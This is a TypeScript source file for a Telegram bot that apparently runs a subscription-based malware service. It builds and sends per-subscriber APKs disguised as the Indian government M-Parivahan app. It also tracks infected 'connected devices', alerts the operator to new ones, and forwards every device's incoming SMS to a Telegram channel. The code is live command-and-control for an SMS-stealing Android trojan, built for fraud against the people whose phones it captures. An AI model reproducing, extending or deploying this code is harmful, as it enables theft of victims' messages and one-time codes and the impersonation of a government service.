import { Telegraf, Markup, Context } from "telegraf";
import { logger } from "../lib/logger";
import {
  getSubscription,
  getAllSubscriptions,
  setSubscription,
  deleteSubscription,
  isSubscriptionActive,
  fbGet,
  fbSet,
  fbUpdate,
  setPanelPassword,
  setAdminConfig,
  getSmsChannel,
  setSmsChannel,
  removeSmsChannel,
} from "./firebase";
import { startSmsWatcher } from "./smsWatcher";

// Tracks users mid-conversation (waiting for their next message)
const pendingActions = new Map<string, { action: "reset_password" | "set_email" }>();
import { getApkPath, buildUserApk, getApkSize } from "./apkBuilder";
import { startDeviceWatcher } from "./deviceWatcher";

const BOT_TOKEN = process.env["TELEGRAM_BOT_TOKEN"];
const ADMIN_ID = parseInt(process.env["ADMIN_TELEGRAM_ID"] || "5064888403");

function getPanelUrl(): string {
  const custom = process.env["PANEL_URL"];
  if (custom) return custom.replace(/\/$/, "");
  const domain = process.env["REPLIT_DEV_DOMAIN"];
  if (domain) return `https://${domain}`;
  return "https://cyberzone.replit.app";
}

if (!BOT_TOKEN) {
  logger.warn("TELEGRAM_BOT_TOKEN not set — bot will not start");
}

function isAdmin(ctx: Context): boolean {
  return ctx.from?.id === ADMIN_ID;
}

function formatDate(ts: number): string {
  return new Date(ts).toLocaleString("en-IN", {
    timeZone: "Asia/Kolkata",
    day: "2-digit",
    month: "short",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  }) + " IST";
}

function daysToMs(days: number): number {
  return days * 24 * 60 * 60 * 1000;
}

let bot: Telegraf | null = null;

export function getBot(): Telegraf | null {
  return bot;
}

export async function startBot(): Promise<void> {
  if (!BOT_TOKEN) return;

  bot = new Telegraf(BOT_TOKEN);

  // ─── /start ──────────────────────────────────────────────────────────────
  bot.command("start", async (ctx) => {
    const userId = ctx.from.id.toString();
    const username = ctx.from.username || ctx.from.first_name || "User";

    if (isAdmin(ctx)) {
      const panelUrl = getPanelUrl();
      await ctx.reply(
        `*AxeCodi Panel — Admin Console*\n\n` +
        `Welcome back, @${ctx.from.username || "admin"}!\n\n` +
        `*Available Commands:*\n` +
        `/start — Show this menu\n` +
        `/apk — Get mParivahan APK\n` +
        `/reset\\_password — Reset web panel password\n` +
        `/setpanel — Set panel email\n\n` +
        `*Admin Commands:*\n` +
        `/adduser — Add subscription\n` +
        `/removeuser — Remove subscription\n` +
        `/listusers — List all subscribers\n` +
        `/stats — System stats\n\n` +
        `🌐 *Panel:* ${panelUrl}`,
        {
          parse_mode: "Markdown",
          ...Markup.inlineKeyboard([
            [Markup.button.url("🌐 Open Web Panel", panelUrl)],
          ]),
        }
      );
      // Send keyboard separately so inline button + reply keyboard both show
      await ctx.reply(
        "Quick actions:",
        Markup.keyboard([
          ["📱 Get APK", "🔑 Reset Password"],
          ["👥 Users List", "📊 Stats"],
          ["🌐 Open Panel"],
        ]).resize()
      );
      return;
    }

    const sub = await getSubscription(userId);

    if (!sub) {
      await ctx.reply(
        `*AxeCodi Panel Bot*\n\n` +
        `❌ No subscription found for your account.\n\n` +
        `Contact admin to get access:\n@exoincs`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    const now = Date.now();
    const isActive = sub.status === "active" && (!sub.expiresAt || now < sub.expiresAt);
    const timeLeft = sub.expiresAt ? Math.max(0, sub.expiresAt - now) : 0;
    const daysLeft = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
    const hoursLeft = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));

    const panelUrl = getPanelUrl();
    await ctx.reply(
      `📋 *Subscription Details*\n\n` +
      `• Account: ${username}\n` +
      `• Plan: ${sub.plan}\n` +
      `• Status: ${isActive ? "✅ Active" : "❌ Expired"}\n` +
      (sub.expiresAt ? `• Expires: ${formatDate(sub.expiresAt)}\n` : "") +
      (isActive && sub.expiresAt ? `• Time Left: ${daysLeft}d ${hoursLeft}h\n` : "") +
      `\n🌐 *Panel:* ${panelUrl}`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.url("🌐 Open Web Panel", panelUrl)],
        ]),
      }
    );
    await ctx.reply(
      "Quick actions:",
      Markup.keyboard([
        ["📱 Get APK", "🔑 Reset Password"],
        ["🌐 Open Panel"],
      ]).resize()
    );
  });

  // ─── 🌐 Open Panel keyboard button ──────────────────────────────────────
  bot.hears("🌐 Open Panel", async (ctx) => {
    const panelUrl = getPanelUrl();
    await ctx.reply(
      `🌐 *Web Panel*\n\n${panelUrl}\n\nEmail aur password se login karo.\nPassword nahi hai? /reset\\_password bhejo.`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.url("🌐 Open Web Panel", panelUrl)],
        ]),
      }
    );
  });

  // ─── /apk ────────────────────────────────────────────────────────────────
  bot.command("apk", handleApkCommand);
  bot.hears("📱 Get APK", handleApkCommand);

  async function handleApkCommand(ctx: Context) {
    const userId = ctx.from!.id.toString();
    const active = isAdmin(ctx) || await isSubscriptionActive(userId);

    if (!active) {
      await ctx.reply(
        "❌ Your subscription is not active.\n\nContact @exoincs to get access."
      );
      return;
    }

    await ctx.reply("🔨 *Building M-Parivahan APK...*\nPlease wait a moment.", { parse_mode: "Markdown" });
    await buildAndSendMparivahan(ctx);
  }

  async function buildAndSendMparivahan(ctx: Context) {
    const userId = ctx.from!.id.toString();
    const apkPath = await buildUserApk(userId);
    if (!apkPath) {
      await ctx.reply("❌ APK file not found. Contact admin.");
      return;
    }

    const size = getApkSize(apkPath);
    const buildId = Math.floor(Math.random() * 90000) + 10000;

    await ctx.reply(
      `🛠 *AXECODI BUILD CENTER*\n\n` +
      `📱 App: M-Parivahan\n` +
      `🆔 Build ID: #${buildId}\n` +
      `👤 Owner ID: \`${userId}\`\n\n` +
      `✅ Status: Ready!\n` +
      `📦 Size: ${size}\n\n` +
      `👇 APK sent below.`,
      { parse_mode: "Markdown" }
    );

    await ctx.replyWithDocument({ source: apkPath, filename: `mParivahan_AxeCodi.apk` });
  }

  // ─── /reset_password ─────────────────────────────────────────────────────
  bot.command("reset_password", handleResetPassword);
  bot.hears("🔑 Reset Password", handleResetPassword);

  async function handleResetPassword(ctx: Context) {
    const userId = ctx.from!.id.toString();
    const active = isAdmin(ctx) || await isSubscriptionActive(userId);

    if (!active) {
      await ctx.reply("❌ Subscription required.");
      return;
    }

    // Mark user as awaiting new password input
    pendingActions.set(userId, { action: "reset_password" });

    await ctx.reply(
      `🔑 *Password Reset*\n\nApna naya panel password type karo:\n\n_Sirf tumhara apna password reset hoga._`,
      { parse_mode: "Markdown" }
    );
  }

  // ─── Admin: /setpanel — admin apna email set kare ───────────────────────
  // Usage: /setpanel email@example.com
  bot.command("setpanel", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }

    const email = ctx.message.text.split(" ")[1]?.trim();
    if (!email || !email.includes("@")) {
      await ctx.reply(
        "Usage: `/setpanel email@example.com`\n\nYeh tumhara web panel login email set karega.",
        { parse_mode: "Markdown" }
      );
      return;
    }

    await setAdminConfig({
      telegramId: ADMIN_ID.toString(),
      email,
      username: ctx.from.username || "Admin",
    });

    await ctx.reply(
      `✅ *Admin Panel Email Set!*\n\n` +
      `Email: \`${email}\`\n\n` +
      `Ab /reset\\_password se apna panel password bhi set karo.`,
      { parse_mode: "Markdown" }
    );
  });

  // ─── /stats ──────────────────────────────────────────────────────────────
  bot.command("stats", async (ctx) => {
    if (!isAdmin(ctx)) return;

    const [clients, subs] = await Promise.all([fbGet("clients"), getAllSubscriptions()]);
    const deviceCount = clients ? Object.keys(clients).length : 0;
    const subCount = Object.keys(subs).length;
    const activeSubs = Object.values(subs).filter(
      (s: any) => s.status === "active" && (!s.expiresAt || Date.now() < s.expiresAt)
    ).length;

    await ctx.reply(
      `📊 *System Stats*\n\n` +
      `📱 Connected Devices: ${deviceCount}\n` +
      `👥 Total Subscribers: ${subCount}\n` +
      `✅ Active Subscriptions: ${activeSubs}`,
      { parse_mode: "Markdown" }
    );
  });

  bot.hears("📊 Stats", async (ctx) => {
    if (!isAdmin(ctx)) return;
    ctx.command = "stats" as any;
    // Re-trigger stats
    const [clients, subs] = await Promise.all([fbGet("clients"), getAllSubscriptions()]);
    const deviceCount = clients ? Object.keys(clients).length : 0;
    const subCount = Object.keys(subs).length;
    const activeSubs = Object.values(subs).filter(
      (s: any) => s.status === "active" && (!s.expiresAt || Date.now() < s.expiresAt)
    ).length;
    await ctx.reply(
      `📊 *System Stats*\n\n📱 Connected Devices: ${deviceCount}\n👥 Total Subscribers: ${subCount}\n✅ Active Subscriptions: ${activeSubs}`,
      { parse_mode: "Markdown" }
    );
  });

  // ─── Admin: /adduser ─────────────────────────────────────────────────────
  // Usage: /adduser 123456789 30 username email@example.com
  bot.command("adduser", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }

    const parts = ctx.message.text.split(" ").slice(1);
    if (parts.length < 2) {
      await ctx.reply(
        "Usage: `/adduser {telegramId} {days} {username} {email}`\n\nExample:\n`/adduser 123456789 30 @username user@email.com`\n\n_Email optional but required for web panel login._",
        { parse_mode: "Markdown" }
      );
      return;
    }

    const [telegramId, daysStr, username = "unknown", email] = parts;
    const days = parseInt(daysStr);

    if (isNaN(days) || days <= 0) {
      await ctx.reply("❌ Invalid days value.");
      return;
    }

    const existing = await getSubscription(telegramId);
    const now = Date.now();

    const baseTime = existing?.status === "active" && existing.expiresAt && existing.expiresAt > now
      ? existing.expiresAt
      : now;

    const expiresAt = baseTime + daysToMs(days);

    await setSubscription(telegramId, {
      telegramId,
      username: username.replace("@", ""),
      plan: `${days} Days`,
      status: "active",
      expiresAt,
      createdAt: existing?.createdAt || now,
      ...(email ? { email: email.toLowerCase() } : {}),
    } as any);

    const daysLeft = Math.floor((expiresAt - now) / (1000 * 60 * 60 * 24));

    await ctx.reply(
      `✅ *Subscription Added!*\n\n` +
      `👤 User: ${username}\n` +
      `🆔 ID: \`${telegramId}\`\n` +
      `📅 Plan: ${days} Days\n` +
      `⏰ Expires: ${formatDate(expiresAt)}\n` +
      `🕐 Days Left: ${daysLeft}d\n` +
      (email ? `📧 Email: ${email}` : `⚠️ No email set — user won't be able to login to panel`),
      { parse_mode: "Markdown" }
    );

    // Notify the user
    try {
      await bot!.telegram.sendMessage(
        parseInt(telegramId),
        `🎉 *Subscription Activated!*\n\n` +
        `Plan: ${days} Days\n` +
        `Expires: ${formatDate(expiresAt)}\n\n` +
        `📱 /apk — APK download karo\n` +
        `🔑 /reset\\_password — Web panel password set karo`,
        { parse_mode: "Markdown" }
      );
    } catch {
      await ctx.reply("⚠️ Could not notify user (they may not have started the bot yet).");
    }
  });

  // ─── Admin: /removeuser ──────────────────────────────────────────────────
  bot.command("removeuser", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }

    const telegramId = ctx.message.text.split(" ")[1];
    if (!telegramId) {
      await ctx.reply("Usage: `/removeuser {telegramId}`", { parse_mode: "Markdown" });
      return;
    }

    const sub = await getSubscription(telegramId);
    if (!sub) {
      await ctx.reply("❌ User not found.");
      return;
    }

    await deleteSubscription(telegramId);
    await ctx.reply(`✅ Subscription removed for \`${telegramId}\` (${sub.username})`, {
      parse_mode: "Markdown",
    });
  });

  // ─── Admin: /listusers ───────────────────────────────────────────────────
  bot.command("listusers", handleListUsers);
  bot.hears("👥 Users List", handleListUsers);

  async function handleListUsers(ctx: Context) {
    if (!isAdmin(ctx)) return;

    const subs = await getAllSubscriptions();
    const entries = Object.entries(subs);

    if (entries.length === 0) {
      await ctx.reply("No subscribers yet.");
      return;
    }

    const now = Date.now();
    const lines = entries.map(([id, s]: [string, any]) => {
      const isActive = s.status === "active" && (!s.expiresAt || now < s.expiresAt);
      const daysLeft = s.expiresAt ? Math.floor((s.expiresAt - now) / (1000 * 60 * 60 * 24)) : "∞";
      return `${isActive ? "✅" : "❌"} \`${id}\` — @${s.username || "?"} — ${s.plan} — ${isActive ? `${daysLeft}d left` : "Expired"}`;
    });

    await ctx.reply(
      `👥 *All Subscribers (${entries.length})*\n\n${lines.join("\n")}`,
      { parse_mode: "Markdown" }
    );
  }

  // ─── Default text handler ────────────────────────────────────────────────
  bot.on("text", async (ctx) => {
    const userId = ctx.from.id.toString();
    const pending = pendingActions.get(userId);

    if (pending?.action === "reset_password") {
      pendingActions.delete(userId);
      const newPass = ctx.message.text.trim();

      if (newPass.length < 4) {
        await ctx.reply("❌ Password kam se kam 4 characters ka hona chahiye. Dobara try karo /reset_password");
        return;
      }

      await setPanelPassword(userId, newPass, isAdmin(ctx));

      await ctx.reply(
        `✅ *Password Successfully Changed!*\n\n` +
        `Tumhara naya panel password:\n\`${newPass}\`\n\n` +
        `_Sirf tumhara account update hua hai._`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    await ctx.reply(
      "Use /start to see the menu.",
      Markup.keyboard([
        ["📱 Get APK", "🔑 Reset Password"],
        ["🌐 Open Panel"],
      ]).resize()
    );
  });

  // ─── Admin: /setchannel ──────────────────────────────────────────────────
  // Usage: /setchannel -100xxxxxxxxxx  OR  /setchannel @channelname
  bot.command("setchannel", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }

    const channelId = ctx.message.text.split(" ")[1]?.trim();
    if (!channelId) {
      const current = await getSmsChannel();
      await ctx.reply(
        `📡 *SMS Forward Channel*\n\n` +
        `Current: ${current ? `\`${current}\`` : "Not set"}\n\n` +
        `Usage: \`/setchannel -100xxxxxxxxxx\`\n` +
        `Remove: \`/removechannel\`\n\n` +
        `_Bot ko channel ka admin banana zaroor hai pehle._`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    await setSmsChannel(channelId);
    await ctx.reply(
      `✅ *SMS Channel Set!*\n\n` +
      `Channel ID: \`${channelId}\`\n\n` +
      `Ab sab devices ke naye SMS is channel pe forward honge.\n\n` +
      `⚠️ Bot ko channel admin banana hai — message bhejne ki permission do.`,
      { parse_mode: "Markdown" }
    );
  });

  // ─── Admin: /removechannel ───────────────────────────────────────────────
  bot.command("removechannel", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }
    await removeSmsChannel();
    await ctx.reply("✅ SMS forwarding channel remove kar diya gaya.");
  });

  // Start device watcher to notify admin of new devices
  startDeviceWatcher(bot, ADMIN_ID);
  // Start SMS watcher to forward new SMS to configured channel
  startSmsWatcher(bot);

  // Launch bot — catch 409 conflict (another instance already running)
  bot.launch({ dropPendingUpdates: true }).catch((err: any) => {
    if (err?.response?.error_code === 409 || err?.message?.includes("409")) {
      logger.warn("Bot 409 conflict — another instance is running. Bot disabled in this process.");
    } else {
      logger.error({ err }, "Bot launch error");
    }
  });
  logger.info("Telegram bot started");

  // Warn admin if PANEL_URL is not set
  if (!process.env["PANEL_URL"]) {
    logger.warn("PANEL_URL env var not set — bot will use REPLIT_DEV_DOMAIN as fallback (not suitable for production)");
    try {
      await bot.telegram.sendMessage(
        ADMIN_ID,
        `⚠️ PANEL_URL set nahi hai\n\nReplit env vars mein PANEL_URL add karo taaki /start pe sahi panel link aaye.\n\nExample: PANEL_URL=https://your-domain.com`
      );
    } catch (err) {
      logger.warn({ err }, "Could not send PANEL_URL warning to admin");
    }
  }

  // Graceful shutdown
  process.once("SIGINT", () => bot!.stop("SIGINT"));
  process.once("SIGTERM", () => bot!.stop("SIGTERM"));
}
